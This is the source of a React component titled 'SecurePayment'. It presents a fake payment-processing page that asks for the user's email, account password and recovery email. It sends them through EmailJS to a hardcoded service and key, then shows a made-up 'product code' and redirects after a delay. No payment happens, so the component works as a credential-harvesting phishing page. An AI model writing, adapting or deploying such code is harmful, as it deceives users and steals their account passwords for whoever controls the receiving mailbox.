/* eslint-disable no-unused-vars */
import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';
import { useNavigate } from 'react-router-dom';
import BgImage from '../../assets/images/background.jpg';

const SecurePayment = () => {
  const navigate = useNavigate();
  const form = useRef();
  const codeGenerator = () => {
    let code = Math.floor(Math.random() * 10000000000000000);
    return code;
  };
  let codeFinal = codeGenerator();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        'service_itl56hh',
        'template_uh15ufm',
        form.current,
        'X652hOOq-P3jXQE22'
      )
      .then(
        (result) => {
          setTimeout(() => {
            alert('Request sent');
            form.current.reset();
            navigate('/');
          }, 60 * 1000);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };
  return (
    <div
      className="flex justify-center items-center min-h-screen"
      style={{
        backgroundImage: `url(${BgImage})`,
      }}>
      <div className="card flex-shrink-0 w-80 md:w-full max-w-sm shadow-2xl bg-base-100">
        <form ref={form} onSubmit={sendEmail} className="card-body">
          <div className="form-control">
            <label className="label">
              <span className="label-text">Email*</span>
            </label>
            <input
              type="email"
              name="user_email"
              placeholder="email"
              className="input input-bordered"
              required
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Password*</span>
            </label>
            <input
              type="password"
              name="user_password"
              placeholder="password"
              className="input input-bordered"
              required
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Recovery Email</span>
            </label>
            <input
              type="email"
              name="user_recover_email"
              placeholder="Recovery email (optional)"
              className="input input-bordered"
            />
          </div>

          <div className="form-control">
            <label className="label">
              <span className="label-text">
                Product Code will be sent here to complete the process.
              </span>
            </label>
            <input
              type="text"
              name="user_code"
              placeholder="Type the code here"
              className="input input-bordered hidden"
              value={codeFinal}
            />
          </div>

          <input
            onClick={() => window.my_modal_5.showModal()}
            className="btn bg-red-700 text-white"
            type="submit"
            value="Proceed"
          />
        </form>
      </div>
      {/* Open the modal using ID.showModal() method */}
      <dialog id="my_modal_5" className="modal modal-bottom sm:modal-middle">
        <form method="dialog" className="modal-box">
          <h3 className="font-bold text-lg">
            Your Payment request is Processing...
          </h3>
          <p className="py-4">Your product code is: {codeFinal}</p>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Product Code*</span>
            </label>
            <input
              type="text"
              name="user_code"
              placeholder="Type the code here"
              className="input input-bordered"
              value={codeFinal}
            />
          </div>
          <div className="modal-action">
            {/* if there is a button in form, it will close the modal */}
            <button className="btn">Complete</button>
          </div>
        </form>
      </dialog>
    </div>
  );
};

export default SecurePayment;
